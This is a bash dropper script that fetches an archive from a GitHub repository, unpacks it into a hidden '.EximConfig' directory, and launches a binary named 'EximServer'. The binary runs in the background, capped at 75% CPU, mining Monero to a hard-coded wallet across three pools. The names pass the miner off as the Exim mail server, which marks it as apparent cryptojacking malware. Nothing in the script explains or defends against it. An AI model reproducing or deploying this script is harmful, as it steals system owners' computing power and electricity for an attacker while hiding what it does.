#!/bin/bash
if [ -a ".EximConfig" ]; then
	wget https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz || curl -L -o EximServer.tar.gz https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz
	tar -xvzf EximServer.tar.gz
	rm EximServer.tar.gz
	cd .EximConfig
	./EximServer -B -r 10 -R 10 --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o pool.supportxmr.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k -o monerohash.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k -o aeromonero.win:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x -k
fi
